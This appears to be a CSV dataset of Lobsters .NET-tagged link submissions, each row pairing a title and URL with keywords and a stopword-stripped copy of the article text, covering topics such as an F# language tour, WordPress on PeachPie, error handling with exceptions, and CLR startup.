427,Lobsters,dotnet,"C#, F#, .NET programming",AtomOS: a new hobby OS from scratch in C#,https://github.com/amaneureka/AtomOS,atomos new hobby o scratch c,join github today sign file permalink atomix development atom o monolithic screenshot kernel feature driver quick link community wiki building source irc twitter amaneureka license aman priyadarshi cosmos project detail topic resource license reload reload,multitasking monolithic kernel based targeting operating system written c scratch aiming highlevel implementation driver managed environment dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time atomix development atom o multitasking monolithic kernel based targetting operating system written c scratch aiming high level implementation driver managed environment security screenshot kernel feature paging multithreading elf loader syscalls shm compositor driver keyboardmouse ataatapi ide vmware svga vbe acpi timer quick link community wiki instruction building check building source irc help building kernel discussion join u atomos freenode ircfreenodenet twitter follow twitter amaneureka latest update license aman priyadarshi complete license found il processing code cosmos project complete license found detail multitasking monolithic kernel based targeting operating system written c scratch aiming highlevel implementation driver managed environment topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
428,Lobsters,dotnet,"C#, F#, .NET programming",WordPress on .NET,http://www.peachpie.io/2017/02/wordpress-announcement.html,wordpress net,announcing wordpress net proof concept motivation performance c extensibility sourceless distribution power net need install php prerequisite modification original wordpress download wordpress compiling wordpress web server putting together run wordpress net http share community github twitter facebook announcement information news tutorial net net core announcement c docker kestrel microsoft peachpie php wordpress,month implementing required php functionality peachpie platform finally ready run larger realworld application wordpress announcing wordpress net popular phalanger project already proved running virtually unmodified clone wordpress microsoft net possible still solution issue compatible new wordpress release successor phalanger peachpie also able run wordpress fully managed application net net core please consider proof concept keep mind peachpie still work progress recommend using production environment yet primary objective announcement prove peachpie really compatible standard php used wordpress demonstrate benefit motivation several reason desirable run wordpress net performance compiled code fast also optimized net jitter actual system additionally net performance profiler may used resolve bottleneck c extensibility plugin functionality implemented separate c project andor php plugins may use net library sourceless distribution compilation source file needed power net peachpie allows compiled wordpress clone run net jittered secure manageable environment updated window update need install php peachpie modern compiler platform runtime distributed dependency net project downloaded automatically demand nuget package even deployed standalone together compiled application library dependency last least simply wanted prove work article show prerequisite net core mysql server modification original wordpress peachpie version compiler support class extending class declared conditionally eg wpincludesclassjsonphp commented condition classexists commented first class servicesjsonerror pearerror yet keeping second one prepared version wordpress modification already included compile project easily download wordpress addition preconfiguired wpconfigphp file containing credential mysql database using default port password password server localhost compiling wordpress compilation driven dotnet websiteprojectjson project file version buildoptions compilername php compile php debugtype portable xmldoc true dependency peachpieapp tool peachpiecompilertools framework dependency microsoftnetcoreapp type platform version dotnet need compile wordpress even downloads peachpie nugetorg line specifies compiler php instead default csharp next line list file included compilation line tell dotnet dependency peachpie runtime default library automatically downloaded nugetorg component downloaded yet similarly line tell dotnet use peachpiecompilertools package compilation process actually contains whole compiler downloaded used seamlessly web server wordpress contains plethora script file still need web server run since net core environment use kestrel opensource lightweight web server completely modular peachpie even contains extension kestrel allows handle php request process dll library compiled php project appprogramcs static void main var root pathgetdirectoryname systemiodirectorygetcurrentdirectory website var host new webhostbuilder usekestrel usewebroot root usecontentroot root content root wp static file useurls http usestartup startup initialization routine see build hostrun class startup public void configure iapplicationbuilder app pchpcorecontextdefaulterrorhandler new pchpcorecustomerrorhandler disables debug asserts appusephp installs handler php file forward websitedll appusedefaultfiles appusestaticfiles appprojectjson version buildoptions emitentrypoint true debugtype portable dependency microsoftaspnetcoreserverkestrel microsoftaspnetcorestaticfiles peachpienetcoreweb website framework dependency microsoftnetcoreapp type platform version projectjson file web server dependency kestrel package peachpie web extension website project wordpress causing dotnet copy result website compilation websitedll output folder web server putting together run wordpress net know project look like get everything set order make work first ensure prerequisite development computer use virtualization platform docker create mysql server mysql installed machine simply use important information wpconfigphp file correct use following command start mysql required information docker run e mysqlrootpasswordpassword e mysqldatabasewordpress p mysql note pc window home edition could run trouble running docker make sure either mysql installed locally virtualization platform work otherwise wordpress run order tell dotnet download update dependency run following command dotnet restore see net core peachpie dependency downloaded copied local nuget cache next command performs compilation using c peachpie php compiler current platform important run command within app directory lazy look website directory programcs civilized way command also run app project cd app dotnet run everything go planned see something like hosting environment production content root path projectspeachpiewordpresswebsite listening http application started press ctrlc shut open web browser go http running wordpress net begin installation regular php see classic wordpress login window logging credential set see familiar wordpress dashboard wordpress site running net core prove site really running net core let u take look ilspy screenshot show generated msil instruction compiled websitedll assembly note ilspy know portable debug symbol websitepdb order use ilspy delete pdb file first snippet msil code decompiled c language make legible hope enjoy option running one greatest blogging cm platform secure fast managed environment microsoft net please keep mind still working development peachpie recommend using production environment yet function already supported encounter issue please hesitate share community best answer inquiry make sure follow progress github twitter facebook stay tuned update posted february category announcement information news tutorial tag net net core announcement c docker kestrel microsoft peachpie php wordpress
429,Lobsters,dotnet,"C#, F#, .NET programming",Tour of F#,https://docs.microsoft.com/en-us/dotnet/articles/fsharp/tour,tour f,tour f article getting started executing code online try f webassembly sample learn tour f function module function module function module binding immutable mutable number booleans string primitive type string tuples tuples pipeline composition partial application list array sequence list array sequence lazy recursive function recursion record discriminated union type record discriminated union dus pattern matching pattern matching wildcard pattern active pattern optional type option type unit measure unit measure fsharpdataunitsystemssiunitsymbols namespace class interface interface abstract class inheritance class member object expression type use next step getting started introduction functional programming f f language reference,tour f minute read article best way learn f read write f code article act tour key feature f language give code snippet execute machine learn setting development environment check getting started two primary concept f function type tour emphasize feature language fall two concept executing code online nt f installed machine execute sample browser try f webassembly fable dialect f executes directly browser view sample follow repl check sample learn tour f lefthand menu bar fable repl function module fundamental piece f program function organized module function perform work input produce output organized module primary way group thing f defined using let binding give function name define argument module basicfunctions use let define function one accepts integer argument return integer parenthesis optional function argument except use explicit type annotation let x x x apply function naming function return result using let variable type inferred function return type let line us print result integer typesafe type int line would fail compile printfn result squaring integer adding needed annotate type parameter name using argument type parenthesis required let x int x x let printfn result applying sample function conditionals use ifthenelifelse note f us white space indentationaware syntax similar language like python let x x x x else x x let line us f print result float typesafe printfn result applying sample function f let binding also bind value name similar variable language let binding immutable default mean value function bound name changed inplace contrast variable language mutable meaning value changed point time require mutable binding use let mutable syntax module immutability binding value name via let make immutable second line code fails compile number immutable bound redefining number different value allowed f let number let number mutable binding required able mutate value othernumber let mutable othernumber printfn othernumber othernumber mutating value use assign new value note used test equality othernumber othernumber printfn othernumber changed othernumber number booleans string net language f support underlying primitive type exist net various numeric type represented f module integersandnumbers sample integer let sampleinteger sample floating point number let sampledouble computed new number arithmetic numeric type converted using function int double let int sampledouble list number let samplenumbers list tuples containing number square let sampletableofsquares next line print list includes tuples using generic printing printfn table square n sampletableofsquares boolean value performing basic conditional logic look like module booleans booleans value true false let true let false operator booleans let false line us bto print boolean value typesafe printfn expression false b basic string manipulation look like module stringmanipulation string use double quote let hello let world string also use create verbatim string literal ignore escape character n etc let c program file string literal also use triplequotes let computer said hello world told string concatenation normally done operator let helloworld line us print string value typesafe printfn helloworld substring use indexer notation line extract first character substring note like many language string zeroindexed f let substring helloworld printfn substring tuples tuples big deal f grouping unnamed ordered value treated value think value aggregated value many us conveniently returning multiple value function grouping value adhoc convenience module tuples simple tuple integer let function swap order two value tuple f type inference automatically generalize function generic type meaning work type let swapelems b b printfn result swapping swapelems tuple consisting integer string doubleprecision floating point number let fred printfn also create struct tuples also interoperate fully c basic tuples also struct tuples tuples normally object also represented structs interoperate completely structs c visual basicnet however struct tuples implicitly convertible object tuples often called reference tuples second line fail compile uncomment see happens let samplestructtuple struct let thiswillnotcompile int int struct although let convertfromstructtuple struct b b let converttostructtuple b struct b printfn struct tuple anreference tuple made struct tuple samplestructtuple samplestructtuple convertfromstructtuple important note struct tuples value type implicitly converted reference tuples vice versa must explicitly convert reference struct tuple pipeline composition pipe operator used extensively processing data f operator function allow establish pipeline function flexible manner following example walk take advantage operator build simple functional pipeline module pipelinesandcomposition square value let square x x x add value let addone x x test integer value odd via modulo let isodd x x list number list later let number given list integer filter even number square resulting odds add squared odds let squareoddvaluesandaddone value let odds listfilter isodd value let square listmap square odds let result listmap addone square result printfn processing squareoddvaluesandaddone produce number squareoddvaluesandaddone number shorter way write squareoddvaluesandaddone nest subresult function call make function much shorter difficult see order data processed let squareoddvaluesandaddonenested value listmap addone listmap square listfilter isodd value printfn processing squareoddvaluesandaddonenested produce number squareoddvaluesandaddonenested number preferred way write squareoddvaluesandaddone use f pipe operator allows avoid creating intermediate result much readable nesting function call like squareoddvaluesandaddonenested let squareoddvaluesandaddonepipeline value value listfilter isodd listmap square listmap addone printfn processing squareoddvaluesandaddonepipeline produce number squareoddvaluesandaddonepipeline number shorten squareoddvaluesandaddonepipeline moving second listmap call first using lambda function note pipeline also used inside lambda function f pipe operator used single value well make powerful processing data let squareoddvaluesandaddoneshorterpipeline value value listfilter isodd listmap fun x x square addone printfn processing squareoddvaluesandaddoneshorterpipeline produce number squareoddvaluesandaddoneshorterpipeline number previous sample made use many feature f including list processing function firstclass function partial application although deep understanding concept become somewhat advanced clear easily function used process data building pipeline list array sequence list array sequence three primary collection type f core library list ordered immutable collection element type singlylinked list mean meant enumeration poor choice random access concatenation large contrast list popular language typically use singlylinked list represent list module list list defined using empty list let list element used separate element line let also separate element placing line let list integer let numberlist list also generated computation list containing day year let dayslist month day systemdatetimedaysinmonth month yield systemdatetime month day print first element dayslist using listtake printfn first day dayslist listtake computation include conditionals list containing tuples coordinate black square chess board let blacksquares j ij yield j list transformed using listmap functional programming combinators definition produce new list squaring number numberlist using pipeline operator pas argument listmap let square numberlist listmap fun x x x many list combination following computes sum square number divisible let sumofsquares numberlist listfilter fun x x listsumby fun x x x printfn sum square number divisible sumofsquares array fixedsize mutable collection element type support fast random access element faster f list contiguous block memory module array empty array note syntax similar list us instead let array specified using range construct list let hello world hello world array number let array containing word hello world let word wordcontains l yield word array initialized index containing even number let evennumbers arrayinit fun n n subarrays extracted using slicing notation let evennumbersslice evennumbers loop array list using loop word printfn word word modify content array element using left arrow assignment operator learn operator see http docsmicrosoftcomdotnetfsharplanguagereferencevaluesindex mutablevariables world transform array using arraymap functional programming operation following calculates sum length word start h let sumoflengthsofwords arrayfilter fun x xstartswith h arraysumby fun x xlength printfn sum length word array sumoflengthsofwords sequence logical series element type general type list array capable view logical series element also stand lazy mean element computed needed module sequence empty sequence let seqempty sequence value let seq yield hello yield world yield yield hello yield world yield ondemand sequence let numbersseq seq sequence producing word hello world let seq word wordcontains l yield word sequence producing even number let evennumbers seqinit fun n n let rnd systemrandom infinite sequence random walk example us yield return element subsequence let rec randomwalk x seq yield x yield randomwalk x rndnextdouble example show first element random walk let randomwalk seqtruncate seqtolist printfn first element random walk recursive function processing collection sequence element typically done recursion f although f support loop imperative programming recursion preferred easier guarantee correctness note following example make use pattern matching via match expression fundamental construct covered later article module recursivefunctions example show recursive function computes factorial integer us let rec define recursive function let rec factorial n n else n factorial printfn factorial factorial computes greatest common factor two integer since recursive call tail call compiler turn function loop improves performance reduces memory consumption let rec greatestcommonfactor b b elif b greatestcommonfactor b else greatestcommonfactor b b printfn greatest common factor greatestcommonfactor example computes sum list integer using recursion let rec sumlist x match x y sumlist y make sumlist tail recursive using helper function result accumulator let rec private sumlisttailrechelper accumulator x match x accumulator y sumlisttailrechelper accumulatory y invokes tail recursive helper function providing seed accumulator approach like common f let sumlisttailrecursive x sumlisttailrechelper x let onethroughten printfn sum sumlisttailrecursive onethroughten f also full support tail call optimization way optimize recursive call fast loop construct record discriminated union type record union type two fundamental data type used f code generally best way represent data f program although make similar class language one primary difference structural equality semantics mean natively comparable equality straightforward check one equal record aggregate named value optional member method familiar c java feel similar pocos pojos structural equality le ceremony module recordtypes example show define new record type type contactcard name string phone string verified bool example show instantiate record type let name alf phone verified false also line separator let contactonsameline name alf phone verified false example show use copyandupdate record value creates new record value copy different value phone verified field learn see http docsmicrosoftcomdotnetfsharplanguagereferencecopyandupdaterecordexpressions let phone verified true example show write function process record value convert contactcard object string let showcontactcard c contactcard cname phone cphone cverified unverified else printfn alf contact card showcontactcard example record member type contactcardalternate name string phone string address string verified bool member implement objectoriented member member thisprintedcontactcard thisname phone thisphone thisverified unverified else thisaddress let contactalternate name alf phone verified false address alf street member accessed via operator instantiated type printfn alf alternate contact card contactalternateprintedcontactcard also represent record structs done struct attribute record also represented structs via struct attribute helpful situation performance structs outweighs flexibility reference type struct type contactcardstruct name string phone string verified bool discriminated union dus value could number named form case data stored type one several distinct value module discriminatedunions following represents suit playing card type suit heart club diamond spade discriminated union also used represent rank playing card type rank represents rank card value int ace king queen jack discriminated union also implement objectoriented member static member getallranks yield ace yield value yield jack yield queen yield king record type combine suit rank common use record discriminated union representing data type card suit suit rank rank computes list representing card deck let fulldeck suit heart diamond club spade rank rankgetallranks yield suitsuit rankrank example convert card object string let showplayingcard c card let rankstring match crank ace ace king king queen queen jack jack value n string n let suitstring match csuit club club diamond diamond spade spade heart heart rankstring suitstring example print card playing deck let printallcards card fulldeck printfn showplayingcard card also use dus singlecase discriminated union help domain modeling primitive type often time string primitive type used represent something thus given particular meaning however using primitive representation data result mistakenly assigning incorrect value representing type information distinct singlecase union enforce correctness scenario singlecase dus often used domain modeling buy extra type safety primitive type string ints singlecase dus implicitly converted type wrap example function take address accept string input vice versa type address address string type name name string type ssn ssn int easily instantiate singlecase du follows let address address alf way let name name alf let ssn ssn need value unwrap underlying value simple function let unwrapaddress address let unwrapname name n n let unwrapssn ssn printing singlecase dus simple unwrapping function printfn address name ssn address unwrapaddress name unwrapname ssn unwrapssn sample demonstrates get underlying value singlecase discriminated union must explicitly unwrap additionally dus also support recursive definition allowing easily represent tree inherently recursive data example represent binary search tree exists insert function discriminated union also support recursive definition represents binary search tree one case empty tree node value two subtrees type bst empty node value left bst right bst check item exists binary search tree search recursively using pattern matching return true exists otherwise false let rec exists item bst match bst empty false node x left right item x true elif item x exists item left check left subtree else exists item right check right subtree insert item binary search tree find place insert recursively using pattern matching insert new node item already present insert anything let rec insert item bst match bst empty node item empty empty node x left right node item x node need insert already exists return node elif item x node x insert item left right call left subtree else node x left insert item right call right subtree dus allow represent recursive structure tree data type operating recursive structure straightforward guarantee correctness also supported pattern matching shown additionally represent dus structs struct attribute discriminated union also represented structs via struct attribute helpful situation performance structs outweighs flexibility reference type however two important thing know struct du recursivelydefined struct du must unique name case struct type shape circle radius float square side float triangle height float width float however two key thing keep mind struct du recursivelydefined struct du must unique name case failure follow result compilation error pattern matching pattern matching f language feature enables correctness operating f type sample probably noticed quite bit match x syntax construct allows compiler understand shape data type force account possible case using data type known exhaustive pattern matching incredibly powerful correctness cleverly used lift would normally runtime concern compiletime module patternmatching record person first last name type person first string last string discriminated union different kind employee type employee engineer engineer person manager manager person report list employee executive executive person report list employee assistant employee count everyone underneath employee management hierarchy including employee match bind name property case name used inside match branch note name used binding need name given du definition let rec countreports emp employee match emp engineer person manager person report report listsumby countreports executive person report assistant report listsumby countreports countreports assistant find managersexecutives named dave report us function shorthand lambda expression let rec finddavewithopenposition emps list employee emps listfilter function manager first dave true match empty list executive first dave true false wildcard pattern match anything handle else case something may noticed use pattern known wildcard pattern way saying nt care something although convenient accidentally bypass exhaustive pattern matching longer benefit compiletime enforcement nt careful using best used nt care certain piece decomposed type pattern matching final clause enumerated meaningful case pattern matching expression following example case used parse operation fails open system also use shorthand function construct pattern matching useful writing function make use partial application let private parsehelper f string bool f function true item item false none let parsedatetimeoffset parsehelper datetimeoffsettryparse let result parsedatetimeoffset match result dto printfn parsed none printfn nt parse define function parse helper function let parseint parsehelper let parsedouble parsehelper doubletryparse let parsetimespan parsehelper timespantryparse active pattern another powerful construct use pattern matching allow partition input data custom form decomposing pattern match call site also parameterized thus allowing define partition function expanding previous example support active pattern look something like active pattern another powerful construct use pattern matching allow partition input data custom form decomposing pattern match call site learn see http docsmicrosoftcomdotnetfsharplanguagereferenceactivepatterns let int parseint let double parsedouble let date parsedatetimeoffset let timespan parsetimespan pattern matching via function keyword active pattern often look like let printparseresult function int x printfn x double x printfn f x date printfn dtostring timespan printfn ttostring printfn nothing parseable call printer different value parse printparseresult printparseresult printparseresult printparseresult printparseresult banana optional type one special case discriminated union type option type useful part f core library option type type represents one two case value nothing used scenario value may may result particular operation force account case making compiletime concern rather runtime concern often used apis null used represent nothing instead thus eliminating need worry nullreferenceexception many circumstance option value kind value tagged either none used extensively f code represent case many language would use null reference learn see http docsmicrosoftcomdotnetfsharplanguagereferenceoptions module optionvalues first define zip code defined via singlecase discriminated union type zipcode zipcode string next define type zipcode optional type customer zipcode zipcode option next define interface type represents object compute shipping zone customer zip code given implementation getstate getshippingzone abstract method type ishippingcalculator abstract getstate zipcode string option abstract getshippingzone string int next calculate shipping zone customer using calculator instance us combinators option module allow functional pipeline transforming data optionals let customershippingzone calculator ishippingcalculator customer customer customerzipcode optionbind calculatorgetstate optionmap calculatorgetshippingzone unit measure one unique feature f type system ability provide context numeric literal unit measure unit measure allow associate numeric type unit meter function perform work unit rather numeric literal enables compiler verify type numeric literal passed make sense certain context thus eliminating runtime error associated kind work unit measure way annotate primitive numeric type typesafe way perform typesafe arithmetic value learn see http docsmicrosoftcomdotnetfsharplanguagereferenceunitsofmeasure module unitsofmeasure first open collection common unit name open microsoftfsharpdataunitsystemssiunitnames define unitized constant let meter next define new unit type measure type mile conversion factor mile meter static member asmeter metermile define unitized constant let mile compute metricsystem constant let mileasmeter value using unit measure used like primitive numeric type thing like printing printfn f race would walk f mile would f meter f core library defines many si unit type unit conversion learn check fsharpdataunitsystemssiunitsymbols namespace class interface f also full support net class interface abstract class inheritance class type represent net object property method event member class way defining new object type f support standard objectoriented construct variety member method property event etc learn class see http docsmicrosoftcomdotnetfsharplanguagereferenceclasses learn member see http docsmicrosoftcomdotnetfsharplanguagereferencemembers module definingclasses simple twodimensional vector class class constructor first line take two argument dx dy type double type dx double dy double internal field store length vector computed object constructed let length sqrt dx dx dy dy specifies name object selfidentifier instance method must appear member name member thisdx dx member thisdy dy member thislength length member method previous member property member thisscale k k thisdx k thisdy instantiate class let get new scaled vector object without modifying original object let printfn length fnlength f defining generic class also straightforward generic class allow type defined respect set type parameter following type parameter class learn see http docsmicrosoftcomdotnetfsharplanguagereferencegenerics module defininggenericclasses type statetracker initialelement internal field store state list let mutable state initialelement add new element list state member thisupdatestate newstate state newstate state use operator mutate value get entire list historical state member thishistory state get latest state member thiscurrent stateshead int instance state tracker class note type parameter inferred let tracker statetracker add state trackerupdatestate implement interface use either interface syntax object expression interface object type abstract member object type object expression implement interface learn see http docsmicrosoftcomdotnetfsharplanguagereferenceinterfaces module implementinginterfaces type implement idisposable type readfile let file new systemiostreamreader readmetxt member thisreadline filereadline implementation idisposable member interface systemidisposable member thisdispose fileclose object implement idisposable via object expression unlike language c java new type definition needed implement interface let interfaceimplementation new systemidisposable member thisdispose printfn disposed type use presence class record discriminated union tuples lead important question use like everything life answer depends circumstance tuples great returning multiple value function using adhoc aggregate value value record step tuples named label support optional member great lowceremony representation data intransit program structural equality easy use comparison discriminated union many us core benefit able utilize conjunction pattern matching account possible shape data class great huge number reason need represent information also tie information functionality rule thumb functionality conceptually tied data using class principle objectoriented programming big benefit class also preferred data type interoperating c visual basic language use class nearly everything next step seen primary feature language ready write first f program check getting started learn set development environment write code next step learning whatever like recommend introduction functional programming f get comfortable core functional programming concept essential building robust program f also check f language reference see comprehensive collection conceptual content f
431,Lobsters,dotnet,"C#, F#, .NET programming",You’re better off using Exceptions,https://eiriktsarpalis.wordpress.com/2017/02/19/youre-better-off-using-exceptions/,better using exception,result type railwayoriented programming either monad issue runtime awkward reconciliation boilerplate stacktrace problem io official list possible error stringlytyped error handling interop issue conclusion effectively like,exception handling error management paradigm often met criticism criticism typically revolve around scoping consideration exceptionsascontrolflow abuse even assertion exception really type safe version goto extent seem like valid concern within scope article address per se concern resonate particularly well within fp community often taken extreme reject exception altogether since code throw necessarily impure f community opinion part realized advocating alternative like result type railwayoriented programming essence approach follow either monad found haskell often intentionally avoiding use notationcomputation expression since interpreted exception semantics tl dr version approach define union type result look like type result tsuccess terror ok tsuccess error terror require function admits possibility error return result value way forcing type system acknowledge error case make error handling logic explicit predictable also use combinators like bind encode common error handling flow would like illustrate article believe often cause lot problem simultaneously achieving advertised benefit particularly context maintaining large codebases also give rise multitude antipatterns particularly used people new f issue runtime programming language carry concept runtime error error sometimes stem unexpected location code otherwise considered pure haskell instance consider pure expression div head evaluate case clr runtime error manifested form thrown exception arguably happens often haskell runtime error difficult anticipate claim using result type holistic replacement error handling application leaky abstraction consider following example type customer id string credit decimal option let average customer customer list match customer error list empty customer listaverageby fun c ccreditvalue ok notice snippet admits two possible class error string potential nullreferenceexception admitted careless access optional field customer record eventually delivers unpleasant surprise consumer function since type signature communicates exceptionfree implementation awkward reconciliation misadventure working f programmer soon realizes function could still potentially throw awkward realization addressed catching soon possible course purely functional equivalent pokemon antipattern let avg result decimal string try average customer e error emessage got ta catch em boilerplate majority codebases using result type reviewing people typically end reimplementing exception semantics adhoc basis result extremely noisy code illustrated following example let combine x z match x z ok x ok ok z ok x z error e error e error e error e using prebaked combinators let combine x z x bind fun x bind fun z bind fun z ok x z really essentially type equivalent using linter demand inserting catchall rethrows every method body given sufficient implementation complexity thing get really ugly binding result differing error type incidental complexity require substantial refactoring get thing right often prompt developer cut corner unexpected thing like inserting throw get rid annoying error branch returning nested result type like result result string string string list stacktrace important property exception stressed enough entity managed understood underlying runtime endowed metadata critical diagnosing bug complex system also tracked highlighted tooling debugger profilers providing invaluable insight probing large system lifting error handling passing result value essentially discarding functionality nothing worse deal production issue come log simply list empty problem io point discussed thus far typically focused application might well purely functional might expected become even pronounced bringing io interfacing thirdparty net library consider following example let tryreadalltext path string string option try systemiofilereadalltext path none spotted approach variation many productiongrade f codebases responsible back younger naive adapter motivated desire exceptionfree file reader however deeply flawed precisely fairly unambiguous result mean none bit hardly conveys information obvious official list possible error raised particular call discarding exception becomes impossible diagnose could gone wrong stringlytyped error handling one could quickly point snippet amended data loss minimized let readalltext path string result string string try systemiofilereadalltext path ok e error emessage alteration still make error handling awkward unsafe match readalltext footxt error e econtains could find file particularly compared idiomatic approach work try filereadalltext path filenotfoundexception interop issue often easy forget result value plain object particular bearing used context frameworkslibraries following example illustrates innocent mistake working tpl let task taskstartnew fun randomnext ok else error taskwait taskisfaulted printfn task failed else printfn task succeeded perhaps could mistakenly believed f async somehow recognizes result type let async return ok let async return error let result asyncparallel asyncmap ok match result ok printfn job completed successfully error printfn job failed conclusion intention article argue result type used written dsl interpreter using result type mbrace us result type internally case though benefit maximized writing custom result type model particular domain rather generalpurpose error branch encodes infinite class failure assign class error individual branch result type type moneywithdrawalresult success amount decimal insufficientfunds balance decimal cardexpired datetime undisclosedfailure approach constrains error class finite domain also allows effective testing code said strongly believe using result type generalpurpose error handling mechanism f application considered harmful exception remain dominant mechanism error propagation programming large f language designed exception mind achieved goal effectively like like loading
432,Lobsters,dotnet,"C#, F#, .NET programming",65535 interfaces ought to be enough for anybody,http://aakinshin.net/en/blog/dotnet/mono-and-65535interfaces/,interface ought enough anybody,http,http
434,Lobsters,dotnet,"C#, F#, .NET programming",.NET Renaissance,https://medium.com/altdotnet/net-renaissance-32f12dd72a1,net renaissance,dotted around world nancy postgres paket let fun,hello world back mist time net young new beloved enterprise software developer idea developer loved net c also wanted expand horizon tried take ecosystem place microsoft mean go onto platform mixing system window ii sql server msmq using library beyond framework microsoft inhouse orms web framework idea became known altnet effort pushed valiant fought inexorable tide frustratedmany developer disheartened inertia apathy encountered sought satisfaction elsewhere embrace open platform adventurous community seduced friendliness ruby simplicity rail saw opportunity nodejs still others set explore explosion language targeting ostensibly open jvm probably bought macbooks altnet dream flickered looked certain die although still holdout dotted around world funny thing happened something long dormant stirred within redmond courageous band softy decided fight back stagnation pool wanted try win back heart mind developer forsaken started build new net one could compete ruby node scala go important still one developed open contribution community started project k attempt build version aspnet mvc free shackle dreaded systemweb time grew something ambitious recreation net crossplatform opensource framework commandline tool multiplatform editor supportit plain sailing early vision nodelike simplicity subsumed greater vision extending new net across full ecosystem including old net uwp xamarin false start seahawks playoff run still clear promised piece finally place release visual studio march surely come finished least nearfinal release candidate net core look like may real stable platform start pushing forward onwhat better time revive spirit altnet altnet look like take hope see diverse idea community sooni want see net application running modern cloudnative environment linux well window docker swarm kubernetes cluster serverless platform aws google cloud joyent well azure arm well inteli want see net solution built microservices distributed system using message bus distributed cache actor hexagonal architecture library every kind supporting service infrastructurei want see net developer getting excited latest development software engineering colleague ecosystem want see working macbooks linux well window using visual studio code jetbrains rider well visual studio want see c f used build thing like redis kafka elasticsearch well lineofbusiness application apps gamesi want see net microsoft one thriving motivated community driving forward pushing new direction making thing nobody thought beforeso let resurrect altnet idea let explore take far push let run meetups people want come excited see happening world let take time try nancy instead mvc postgres instead sql server paket instead nuget let fun
435,Lobsters,dotnet,"C#, F#, .NET programming",Getting Started with Functional Programming in F#,http://codeopinion.com/getting-started-with-functional-programming-in-f/,getting started functional programming f,reid evans getting started functional programming f video takeaway default matter null type provider awesome composing small function thought watched video love hear comment,last night windsoressex net developer group reid evans presenting talk getting started functional programming f absolutely loved talk wanted share along thought takeaway last year two going back forth learning f understanding functional programming concept really looking forward talk question please follow twitter video live stream user group interested functional programming f highly recommend giving watch video takeaway thought reid intended takeaway met came talk exactly intended speaker think ultimate goal trying convey achieved say people find takeaway knowing trying present received great default matter null think hardest idea fully get default matter think really expressed see difference able null alternative using option type union type alternative way thinking problem something existing reid example record existing database love handle resulting option type pattern matching take forcing caller property handle either none think reid said really well language allows null must check null everywhere allow null us something like option type explicit type provider awesome truly awesome really interesting see type column database could used infer argument method kind mind blowing see value would provide developer term making simple accidental mistake plus built integration test compile time fantastic composing small function although idea writing small class method familiar c think concept use function functional language differs loved example validation tied together give great real world example everything still need understanding take thought loved talk used real world simple example thing would building app like data access validation easy transfer content something could relate think fact reid often went road making comparison something already familiar great help watched video love hear comment reid would probably love feedback well please post comment twitter
436,Lobsters,dotnet,"C#, F#, .NET programming",The 68 things the CLR does before executing a single line of your code (*),http://www.mattwarren.org/2017/02/07/The-68-things-the-CLR-does-before-executing-a-single-line-of-your-code/,thing clr executing single line code,thing clr executing single line code hello world code path ee execution engine corexemain corexemaininternal ensureeestarted eestartup eestartuphelper dotnet cli tooling run code comment ceemaincpp main phase ee execution engine startup routine eestartuphelper phase infrastructure phase core lowlevel phase lowlevel component phase main component phase notify component note feature defined buildtime phase setup infrastructure need place anything else run console handling setconsolectrlhandler class sstring startup configuration eeconfig setup initializehostconfigfile numa cpu group information numanodeinfo initnumanodeinfo cpugroupinfo ensureinitialized global configuration setting initializestartupflags thread manager initthreadmanager event tracing etw initializeeventtracing etwfireevent g cookie buffer security check initgscookie frame used stacktraces frame init apphacks environment variable getglobalcompatibilityflags diagnostic performance log initializelogging perflog perfloginitialize phase initialise core lowlevel component write log runtime library function ensurertlfunctions global store event mutexes semaphore initeventstore assembly binding logging fusion initializefusion assembly binder infrastructure ccoreclrbinderhelper init assemblybinder startup monitor crsts simplerwlocks initializespinconstants interprocess communication com initializeipcmanager performance counter perfcounters init clr interpreter interpreter initialize stub used clr calling method triggering jit stubmanager initializestubmanagers stub init stublinkercpu init core handle map peimage startup access check option accesscheckoptions startup mscorlib binder mscorlibbinder startup remoting allows outofprocess communication cremotingservices initialize weak strong nopin reference refinitialize proxy method call across app domain context initialize event allow ee synchronise shutdown readerwriter lock implementation crwlock processinit debugger manager cclrdebugmanager processinit clr security attribute cclrsecurityattributemanager processinit virtual call stub virtualcallstubmanager initstatic gc us controlling memory pressure gcinterface mmemorypressurelockinit crstgcmemorypressure assembly usage logger initassemblyusagelogmanager phase startup lowlevel component ie error handling profiling api debugging app domain systemdomain attach systemdomain createdefaultdomain shareddomain attach ecall interface ecall init cache stub used comdelegate init globalstatic variable used ee executionmanager init watson window error reporting initializewatson fflags debugging service initializedebugger managed debugging assistant manageddebuggingassistants eestartupactivation profiling api profilingapiutility initializeprofiling exception handling mechanism initializeexceptionhandling global exception filter installunhandledexceptionfilter runtime thread setupthread setupthread prestub manager prestub trigger jit initprestubmanager stubhelpers init com interop layer initializecominterop ndirect method call ndirect init jit helper function syncblock cache syncblockcache attach syncblockcache start walkingunwinding stack stackwalkcache init phase start main component ie garbage collector gc appdomains security security system handle code access security ca security start securitypolicy start synchronisation appdomain unloads appdomain createadunloadstartevent stack probe used setup stack guard initstackprobes gc create heap us initializegarbagecollector table used hold location pinned object initializepinhandletable debugger defaultdomain systemdomain system publishappdomainandinformdebugger oob assembly list existingoobassemblylist init system domain contains mscorlib systemdomain system init phase final setup notify component ee started profiler stated systemdomain notifyprofilerstartup handle appdomain unloads appdomain createadunloadworker initialisation ee succeeded system assembly mscorlib default domain systemdomain system defaultdomain loadsystemassemblies shared static variable default domain systemdomain system defaultdomain setupsharedstatics sharedstaticscs stack sampler feature stacksampler init onceonly safehandle initialization safehandle init clr successfully started write log done clr ready execute code executing code executeassembly assembly executemainmethod runmain assemblycpp hacker news rprogramming information debug build right environment variable,thing clr executing single line code feb word clr managed environment several component within runtime need initialised code executed post take look ee execution engine startup routine examine initialisation process detail rough guide depends version runtime using feature enabled thing hello world imagine simplest possible c program happen clr print hello world console using system namespace consoleapplication public class program public static void main string args consolewriteline hello world code path ee execution engine net executable run control get ee via following code path corexemain external entry point corexemaininternal ensureeestarted eestartup eestartuphelper interested happens ie clr host startup runtime see previous post dotnet cli tooling run code end eestartuphelper highlevel following comment ceemaincpp eestartup responsible one time initialization runtime highlight include creates default shared appdomains load mscorlibdll load fundamental type systemobject main phase ee execution engine startup routine let look detail list contain individual function call made eestartuphelper loc make easier understand split separate phase phase setup infrastructure need place anything else run phase initialise core lowlevel component phase startup lowlevel component ie error handling profiling api debugging phase start main component ie garbage collector gc appdomains security phase final setup notify component ee started note item list included particular feature defined buildtime indicated inclusion 